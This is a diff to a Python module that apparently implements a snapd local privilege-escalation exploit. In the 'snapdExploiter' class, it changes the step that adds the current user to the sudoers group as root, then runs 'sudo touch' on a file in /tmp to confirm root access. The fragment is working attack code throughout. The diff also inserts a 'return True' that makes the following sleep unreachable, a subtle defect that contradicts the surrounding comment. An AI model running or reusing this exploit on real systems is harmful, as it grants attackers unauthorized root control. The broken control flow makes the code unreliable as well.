@@ -115,6 +115,7 @@ def delete_snap(client_sock):
 
     # We sleep to allow the API command to complete, otherwise the install
     # may fail.
+    return True
     time.sleep(SLEEP)
 
 
@@ -228,11 +229,15 @@ class snapdExploiter(HostPrivExploiter):
         operation = 'touch /tmp/'
         # add the user to the sudo group
         AddUserAsSudoers = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
-        command = AddUserAsSudoers + " && " + operation + filename
+        command = AddUserAsSudoers
 
         if runCommandAsRoot(command):
             # check if exploit is successful
             file_path = "/tmp/%(filename)s"
+            touch_file = "sudo " + operation + filename
+            os.popen(touch_file).read()[:-1]
+            LOG.info("Touching the file %s" % touch_file)
+            time.sleep(1) # sleep untill the file is created
             if not check_if_sudoer(file_path %{'filename':filename}):
                 LOG.info("Either file doesn't exist or is not owned by root!")
                 return False
